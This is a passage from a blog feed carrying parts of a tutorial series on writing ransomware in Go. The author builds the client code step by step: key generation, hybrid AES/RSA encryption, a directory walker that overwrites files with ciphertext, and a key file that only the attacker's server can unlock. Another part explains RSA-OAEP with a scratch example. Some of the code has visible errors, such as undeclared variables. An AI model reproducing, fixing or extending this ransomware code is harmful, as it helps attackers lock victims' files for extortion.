	<span style="color:#ae81ff">0xcb</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0xa8</span>, <span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x2a</span>,
	<span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0xf2</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0xb9</span>, <span style="color:#ae81ff">0x00</span>,
	<span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0xf4</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xa4</span>, <span style="color:#ae81ff">0x8f</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0xb4</span>,
	<span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0x7d</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0xb0</span>, <span style="color:#ae81ff">0x61</span>,
	<span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0xcc</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0xce</span>, <span style="color:#ae81ff">0x1c</span>,
	<span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x7b</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0xd9</span>, <span style="color:#ae81ff">0x99</span>,
	<span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0xfa</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x8a</span>,
	<span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x4e</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0xa3</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0xaa</span>,
	<span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xcb</span>, <span style="color:#ae81ff">0xb6</span>, <span style="color:#ae81ff">0xbc</span>,
	<span style="color:#ae81ff">0xde</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0x4b</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x38</span>,
	<span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x1b</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xf6</span>, <span style="color:#ae81ff">0xb0</span>,
	<span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x0b</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0xd2</span>,
	<span style="color:#ae81ff">0xad</span>, <span style="color:#ae81ff">0xfa</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0xb1</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0xdc</span>,
	<span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0xb9</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xe6</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0x36</span>,
	<span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x01</span>}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">init</span>() {
	<span style="color:#66d9ef">var</span> err <span style="color:#66d9ef">error</span>
	serverKey, err = x509.<span style="color:#a6e22e">ParsePKCS1PublicKey</span>(serverKeyBytes)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	clientPrv, err <span style="color:#f92672">:=</span> rsa.<span style="color:#a6e22e">GenerateKey</span>(rand.Reader, <span style="color:#ae81ff">1024</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	n <span style="color:#f92672">:=</span> big.<span style="color:#a6e22e">NewInt</span>(<span style="color:#ae81ff">0</span>)
	n.<span style="color:#a6e22e">SetBytes</span>(clientPrv.PublicKey.N.<span style="color:#a6e22e">Bytes</span>())
	clientKey = <span style="color:#f92672">&amp;</span>rsa.PublicKey{
		N: n,
		E: clientPrv.PublicKey.E,
	}

	encodedPrv <span style="color:#f92672">:=</span> x509.<span style="color:#a6e22e">MarshalPKCS1PrivateKey</span>(clientPrv)
	log.<span style="color:#a6e22e">Println</span>(encodedPrv)

	<span style="color:#75715e">// encrypt client prv
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// write encrypted client prv to file
</span><span style="color:#75715e"></span>}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	log.<span style="color:#a6e22e">Println</span>(clientKey)
	log.<span style="color:#a6e22e">Println</span>(serverKey)
}
</pre>
<p>With our server key loaded and client key generated, we need to now encrypt the client key and store it. This will be provided to the server for decryption.</p>

<p>To do this, we can use the same encryption scheme we would for other files. That is, we will generate a symmetric key for the file, encrypt the file, encrypt that symmetric key with the server&rsquo;s public key, store that information. We will create a helper function <code>zero()</code> to clear key data from memory.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#75715e">// overwrite data in memory
</span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">zero</span>(bs []<span style="color:#66d9ef">byte</span>) {
	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> bs {
		bs[i] = <span style="color:#ae81ff">0x41</span>
	}
}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">pad</span>(bs []<span style="color:#66d9ef">byte</span>, blksz <span style="color:#66d9ef">int</span>) []<span style="color:#66d9ef">byte</span> {
	count <span style="color:#f92672">:=</span> blksz
	<span style="color:#66d9ef">if</span> len(bs) <span style="color:#f92672">%</span> blksz <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> {
		count = blksz  <span style="color:#f92672">-</span> (len(bs) <span style="color:#f92672">%</span> blksz)
	}

	padding <span style="color:#f92672">:=</span> bytes.<span style="color:#a6e22e">Repeat</span>([]<span style="color:#66d9ef">byte</span>{byte(count)}, count)
	bs = append(bs, padding<span style="color:#f92672">...</span>)
	<span style="color:#66d9ef">return</span> bs
}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">encryptHybrid</span>(
	rsaKey <span style="color:#f92672">*</span>rsa.PublicKey, bs []<span style="color:#66d9ef">byte</span>) ([]<span style="color:#66d9ef">byte</span>, []<span style="color:#66d9ef">byte</span>) {
	<span style="color:#75715e">// generate symmetric key
</span><span style="color:#75715e"></span>	k <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">16</span>)
	rand.<span style="color:#a6e22e">Read</span>(k)

	<span style="color:#75715e">// make cipher
</span><span style="color:#75715e"></span>	blk, err <span style="color:#f92672">:=</span> aes.<span style="color:#a6e22e">NewCipher</span>(k)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	<span style="color:#75715e">// pad plaintext
</span><span style="color:#75715e"></span>	bs = <span style="color:#a6e22e">pad</span>(bs, blk.<span style="color:#a6e22e">BlockSize</span>())
	
	<span style="color:#75715e">// make iv
</span><span style="color:#75715e"></span>	iv <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, blk.<span style="color:#a6e22e">BlockSize</span>())
	rand.<span style="color:#a6e22e">Read</span>(iv)

	<span style="color:#75715e">// encrypt plaintext with symmetric key
</span><span style="color:#75715e"></span>	enc <span style="color:#f92672">:=</span> cipher.<span style="color:#a6e22e">NewCBCEncrypter</span>(blk, iv)
	enc.<span style="color:#a6e22e">CryptBlocks</span>(bs, bs)

	<span style="color:#75715e">// append iv to ciphertext
</span><span style="color:#75715e"></span>	enc = append(enc, iv<span style="color:#f92672">...</span>)

	<span style="color:#75715e">// encrypt symmetric key with asymmetric key
</span><span style="color:#75715e"></span>	ek, err <span style="color:#f92672">:=</span> rsa.<span style="color:#a6e22e">EncryptOAEP</span>(
		sha256.<span style="color:#a6e22e">New</span>(), rand.Reader, rsaKey, k, <span style="color:#66d9ef">nil</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	<span style="color:#75715e">// clear unencrypted key
</span><span style="color:#75715e"></span>	<span style="color:#a6e22e">zero</span>(k)

	<span style="color:#66d9ef">return</span> ek, bs
}
</pre>
<p>After calling <code>encryptHybrid()</code> we will have the ciphertext with IV, and the encrypted symmetric key that use used to encrypt the ciphertext. The encrypted symmetric key is encrypted with the provided RSA public key. We can now extend our <code>init()</code> function to use this. Also introduced is a function <code>rmifex()</code> which will remove a file if it exists.</p>

<p>We&rsquo;ll store the encrypted client private key in a file <code>master.key</code>. This file will be posted to the server because, despite what ransomware victims who end up paying believe, backups are important.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">init</span>() {
	<span style="color:#66d9ef">var</span> err <span style="color:#66d9ef">error</span>
	serverKey, err = x509.<span style="color:#a6e22e">ParsePKCS1PublicKey</span>(serverKeyBytes)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	clientPrv, err <span style="color:#f92672">:=</span> rsa.<span style="color:#a6e22e">GenerateKey</span>(rand.Reader, <span style="color:#ae81ff">1024</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	n <span style="color:#f92672">:=</span> big.<span style="color:#a6e22e">NewInt</span>(<span style="color:#ae81ff">0</span>)
	n.<span style="color:#a6e22e">SetBytes</span>(clientPrv.PublicKey.N.<span style="color:#a6e22e">Bytes</span>())
	clientKey = <span style="color:#f92672">&amp;</span>rsa.PublicKey{
		N: n,
		E: clientPrv.PublicKey.E,
	}

	encodedPrv <span style="color:#f92672">:=</span> x509.<span style="color:#a6e22e">MarshalPKCS1PrivateKey</span>(clientPrv)
	log.<span style="color:#a6e22e">Println</span>(encodedPrv)

	encyptedPrv, encSymKey <span style="color:#f92672">:=</span> <span style="color:#a6e22e">encryptHybrid</span>(serverKey, encodedPrv)

	<span style="color:#75715e">// write encrypted client prv to file
</span><span style="color:#75715e"></span>	<span style="color:#a6e22e">rmifex</span>(<span style="color:#e6db74">&#34;master.key&#34;</span>)
	err = ioutil.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#e6db74">&#34;master.key&#34;</span>, encryptedPrv, <span style="color:#ae81ff">0444</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	<span style="color:#75715e">// store encrytped symmetric key 
</span><span style="color:#75715e"></span>
	<span style="color:#a6e22e">zero</span>(encodedPrv)
}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">rmifex</span>(path <span style="color:#66d9ef">string</span>) {
	_, err <span style="color:#f92672">:=</span> os.<span style="color:#a6e22e">Stat</span>(path)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
		err <span style="color:#f92672">:=</span> os.<span style="color:#a6e22e">Remove</span>(path)
		<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
			log.<span style="color:#a6e22e">Fatal</span>(err)
		}
	}
}
</pre>
<p>Now we need to store all the symmetric keys used for encrypting files somewhere. Rather than storing this with each file, we are going to store them in one convenient location. This is going to be a JSON file, <code>keys.json</code>, containing a list of objects. The objects will have the path of the file, and the corresponding symmetric key for that file. The symmetric keys will all be encrypted with the client&rsquo;s public key, with the one exception of the first entry. That entry will be for <code>master.key</code> which is encrypted with the server&rsquo;s public key.</p>

<p>To decrypt everything we will send the first entry and <code>master.key</code> to the server. The server will decrypt the symmetric key, then use that to decrypt the client&rsquo;s private key stored in <code>master.key</code>. The client&rsquo;s private key can then be packaged in a decryptor to decrypt the remaining entries in <code>keys.json</code>. Once those entries are decrypted, the symmetric keys can be applied to the original files.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">type</span> EncryptionInfo <span style="color:#66d9ef">struct</span> {
	Path <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">json:&#34;path&#34;</span><span style="color:#e6db74">`</span>
	Key  []<span style="color:#66d9ef">byte</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">json:&#34;key&#34;</span><span style="color:#e6db74">`</span>
}

<span style="color:#66d9ef">type</span> EncryptionInfos []EncryptionInfo

<span style="color:#66d9ef">var</span> eis EncryptionInfos
</pre>
<p>With that, we can finalize our <code>init()</code> function. We remove <code>keys.json</code> if it exists. We store the one encryption info structure for <code>master.key</code> in our slice, and then we zero out the client&rsquo;s private key in memory.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">init</span>() {
	<span style="color:#66d9ef">var</span> err <span style="color:#66d9ef">error</span>
	serverKey, err = x509.<span style="color:#a6e22e">ParsePKCS1PublicKey</span>(serverKeyBytes)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	clientPrv, err <span style="color:#f92672">:=</span> rsa.<span style="color:#a6e22e">GenerateKey</span>(rand.Reader, <span style="color:#ae81ff">1024</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	n <span style="color:#f92672">:=</span> big.<span style="color:#a6e22e">NewInt</span>(<span style="color:#ae81ff">0</span>)
	n.<span style="color:#a6e22e">SetBytes</span>(clientPrv.PublicKey.N.<span style="color:#a6e22e">Bytes</span>())
	clientKey = <span style="color:#f92672">&amp;</span>rsa.PublicKey{
		N: n,
		E: clientPrv.PublicKey.E,
	}

	encodedPrv <span style="color:#f92672">:=</span> x509.<span style="color:#a6e22e">MarshalPKCS1PrivateKey</span>(clientPrv)
	log.<span style="color:#a6e22e">Println</span>(encodedPrv)

	encryptedPrv, encSymKey <span style="color:#f92672">:=</span> <span style="color:#a6e22e">encryptHybrid</span>(serverKey, encodedPrv)

	<span style="color:#a6e22e">rmifex</span>(<span style="color:#e6db74">&#34;master.key&#34;</span>)
	err = ioutil.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#e6db74">&#34;master.key&#34;</span>, encryptedPrv, <span style="color:#ae81ff">0444</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	<span style="color:#a6e22e">rmifex</span>(<span style="color:#e6db74">&#34;keys.json&#34;</span>)
	eis = append(eis, EncryptionInfo{
		Path: <span style="color:#e6db74">&#34;master.key&#34;</span>,
		Key: encSymKey,
	})

	<span style="color:#a6e22e">zero</span>(encodedPrv)
	clientPrv.D.<span style="color:#a6e22e">SetInt64</span>(<span style="color:#ae81ff">0</span>)
	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> clientPrv.Primes {
		clientPrv.Primes[i].<span style="color:#a6e22e">SetInt64</span>(<span style="color:#ae81ff">0</span>)
	}
}
</pre>
<p>This is the bulk of our ransomware! We just need to tie it into main and a walker function, both of which we know how to do. Our main function will start walking. I&rsquo;m going to use a hardcoded path so I don&rsquo;t stomp something on my host. After our program has taken an belligerent stroll through the filesystem, we&rsquo;ll marshal our encryption info slice <code>eis</code> to JSON then write that to a file.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	err <span style="color:#f92672">:=</span> filepath.<span style="color:#a6e22e">Walk</span>(
		<span style="color:#e6db74">&#34;C:\\Users\\tacixat\\prog\\ransomware\\victim&#34;</span>, walker)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;Error walking:&#34;</span>, err)
		<span style="color:#66d9ef">return</span>
	}

	data, err <span style="color:#f92672">:=</span> json.<span style="color:#a6e22e">Marshal</span>(eis)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	err = ioutil.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#e6db74">&#34;file.keys&#34;</span>, data, <span style="color:#ae81ff">0444</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}
}
</pre>
<p>Our walker here is also very straightforward. If we come in with an error, we&rsquo;ll print and return it. Returning the error will stop the walker entirely, which we will use for debugging. However, on a customer&rsquo;s machine we would want to return nil to keep the dream alive. After that, we will return nil if it is a directory. Then we read the file, encrypt it, store the key, then write it back to disk.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">walker</span>(path <span style="color:#66d9ef">string</span>, info os.FileInfo, err <span style="color:#66d9ef">error</span>) <span style="color:#66d9ef">error</span> {
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Error on:&#34;</span>, path)
		<span style="color:#66d9ef">return</span> err
	}

	<span style="color:#66d9ef">if</span> info.<span style="color:#a6e22e">IsDir</span>() {
		log.<span style="color:#a6e22e">Println</span>(path, <span style="color:#e6db74">&#34;(d)&#34;</span>)
		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
	}

	log.<span style="color:#a6e22e">Println</span>(path, <span style="color:#e6db74">&#34;(f)&#34;</span>)

	pbs, err <span style="color:#f92672">:=</span> ioutil.<span style="color:#a6e22e">ReadFile</span>(path)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	cbs, k = <span style="color:#a6e22e">encryptHybrid</span>(clientKey, bs)

	err = ioutil.<span style="color:#a6e22e">WriteFile</span>(path, cbs, <span style="color:#ae81ff">0666</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	eis = append(eis, EncryptionInfo{
		Path: path,
		Key: k,
	})

	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
}
</pre>
<p>With that we have the core functionality of a ransomware client in less than 350 lines of code. Pretty wild.</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Thu, 02 Sep 2021 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>Asymmetric Crypto - Ransomware in Golang Part 2</title>
      <link>https://tacix.at/posts/Asymmetric Crypto - Ransomware in Golang Part 2.html</link>
      <description>Key generation and some scratch encryption...</description>
      <content:encoded><![CDATA[<p>If you&rsquo;re late to class, check out parts 0 and 1 at <a href="https://tacix.at">tacix.at</a>.</p>

<h2>Public Key Cryptography</h2>

<p>Two types of encryption schemes to be aware of are public key (or asymmetric) cryptography, and symmetric-key cryptography.</p>

<p>Symmetric cryptography uses the same key for encryption and decryption. For example, you have some plaintext and some key, <code>ciphertext = encrypt(plaintext, key)</code>. Going the other direction, with your ciphertext, <code>plaintext = decrypt(ciphertext, key)</code>. The tricky thing here is both parties need to have the secret key, so that needs to be sent over some secure channel.</p>

<p>Asymmetric cryptography is a little different. Each party has a public key and private key. They are as their names describe, one is sharable and the other is to be kept secret. The public key can encrypt data, and the private key can decrypt it. So if you had a message for me, and you had my public key, you could encrypt that message and only I (or whoever has gained possession of my private key) could decrypt it. Conversely, you can also sign and verify. You sign data using the private key, and anyone with the public key can verify that signature.</p>

<p>In the context of our ransomware, the client (the malware that runs on the victim&rsquo;s computer) will encrypt their own private key with the server&rsquo;s public key. This way, the server will hold the <em>key</em> (eh? eh?) to unlocking the victim&rsquo;s files.</p>

<h3>RSA</h3>

<p>RSA is a cryptosystem taking it&rsquo;s name from three individuals - Rivest, Shamir, and Adleman respectively. There is also a company called RSA, and they throw a big conference also called RSA where vendors go to sell security offerings to each other. Here we are talking about the cryptosystem though.</p>

<p>Trail of Bits sings RSA&rsquo;s praises in their blog post <a href="https://blog.trailofbits.com/2019/07/08/fuck-rsa/">Seriously, stop using RSA</a>. You should definitely read that post, you will learn some shit. We are going to disregard their advice though and use RSA because we are cowboy malware authors. At worst, our toy malware will have a crypto flaw in it that Brian Krebs will write a dissertation on after he doxxes us and a few other people who might be us for good measure, and then we will fix the flaw and carry on with our lives.</p>

<p>More likely, Golang&rsquo;s RSA library will have sane defaults and everything will be OK. Until, of course, a flaw is found in that library <a href="https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/">like these cool XML/SAML vulns</a>. C&rsquo;est la vie.</p>

<h3>Less talk, more typie typie</h3>

<p>Alright, 程序猿 reporting for duty. Here&rsquo;s a little scratch program that generates a key, encrypts a short plaintext, then decrypts it.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#75715e">// scratch/asym.go
</span><span style="color:#75715e"></span><span style="color:#f92672">package</span> main

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;crypto/rand&#34;</span>
	<span style="color:#e6db74">&#34;crypto/rsa&#34;</span>
	<span style="color:#e6db74">&#34;crypto/sha256&#34;</span>
	<span style="color:#e6db74">&#34;log&#34;</span>
	<span style="color:#e6db74">&#34;fmt&#34;</span>
)

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	privateKey, err <span style="color:#f92672">:=</span> rsa.<span style="color:#a6e22e">GenerateKey</span>(rand.Reader, <span style="color:#ae81ff">1024</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}
	publicKey <span style="color:#f92672">:=</span> privateKey.PublicKey

	p <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">byte</span>{<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>}
	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Plaintext:\t%v\n&#34;</span>, p)

	c, err <span style="color:#f92672">:=</span> rsa.<span style="color:#a6e22e">EncryptOAEP</span>(
		sha256.<span style="color:#a6e22e">New</span>(), rand.Reader, <span style="color:#f92672">&amp;</span>publicKey, p, <span style="color:#66d9ef">nil</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Ciphertext:\t%v\n&#34;</span>, c)

	pd, err <span style="color:#f92672">:=</span> rsa.<span style="color:#a6e22e">DecryptOAEP</span>(
		sha256.<span style="color:#a6e22e">New</span>(), rand.Reader, privateKey, c, <span style="color:#66d9ef">nil</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Decrypted:\t%v\n&#34;</span>, pd)
}
</pre>
<p>First things first, we&rsquo;re importing <code>crypto/rand</code>. This is a cryptographically secure random number generator and not a psuedo random number generator. Pseudo random number generators (i.e. <code>math/random</code>) use some cute math to produce seemingly random numbers which <a href="https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f">are often predictable</a>. This is fine in cases where it doesnt matter but cryptography is a case where it absolutely does matter.</p>

<p>Next we generate our private key by passing our source of random bytes and a key size in bits to <a href="https://golang.org/pkg/crypto/rsa/#GenerateKey"><code>rsa.GenerateKey()</code></a>. Here we are using 1024 which is small but <a href="https://crypto.stackexchange.com/a/1982/80736">hasn&rsquo;t been factored yet</a>. I think these can be any size but in practice you only ever seen multiples of 1024 (i.e. 2048, 3072, 4096). I&rsquo;ve seen keys smaller than 1024 that weren&rsquo;t multiples of 1024 but you get the point, generally powers of 2.</p>

<p>Then we get the public key out of the <a href="https://golang.org/pkg/crypto/rsa/#PrivateKey">private key struct</a>, and also make a 16 byte plaintext.</p>

<p>Onto the encryption. We&rsquo;re using <code>rsa.EncryptOAEP()</code> from Go&rsquo;s <code>crypto/rsa</code>package. Take a look at the <a href="https://golang.org/pkg/crypto/rsa/#EncryptOAEP">docs</a>, get comfortable reading docs when writing Go. They are your friend.</p>

<p>We have two choices for encryption in the <code>rsa</code> package. <code>EncryptPKCS1v15()</code> and <code>EncryptOAEP()</code>. Reading the package overview, or the <code>EncryptPKCS1v15</code> description, or the Trail of Bits blog post should guide you to <code>EncryptOAEP()</code>. From the package description -</p>

<blockquote>
<p>The original specification for encryption and signatures with RSA is PKCS #1 and the terms &ldquo;RSA encryption&rdquo; and &ldquo;RSA signatures&rdquo; by default refer to PKCS #1 version 1.5. However, that specification has flaws and new designs should use version 2, usually called by just OAEP and PSS, where possible.</p>
</blockquote>

<p>We&rsquo;ve decided on <code>OAEP</code>, let&rsquo;s review some of the parameters.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">c, err <span style="color:#f92672">:=</span> rsa.<span style="color:#a6e22e">EncryptOAEP</span>(
		sha256.<span style="color:#a6e22e">New</span>(), rand.Reader, <span style="color:#f92672">&amp;</span>publicKey, p, <span style="color:#66d9ef">nil</span>)
</pre>
<p>The first is a hash function, which is used to hash the data gotten from the <code>random.Reader</code> which is passed in as the second parameter. This randomness is used to make sure the same plaintext doesn&rsquo;t encrypt to the same ciphertext. If it did, and say you were encrypting each letter you typed, someone could do a frequency analysis on the ciphertexts and figure out which ones corresponded to which keys. This would be bad.</p>

<p>Next we pass in a pointer to our public key and the plaintext. The last parameter is a label, if we were encrypting multiple things we might want to label them. That would ensure that one type of encrypted thing couldn&rsquo;t be confused as the other. We aren&rsquo;t though so that is <code>nil</code>.</p>

<p>There is also a spooky statement at the end of the description of <code>EncryptOAEP()</code> - <code>The message must be no longer than the length of the public modulus minus twice the hash length, minus a further 2.</code>. Alright, time for some math. Our public modulus is 1024 bits, a SHA256 is 32 bytes, and there are 8 bits in a byte. <code>1024 bits - (32 bytes * 2 * 8 bits/byte) - 2 bits = 510 bit message</code>. <code>510 bits / 8 bits/byte = 63.75</code>. Cool, so we can encrypt up to 63 bytes.</p>

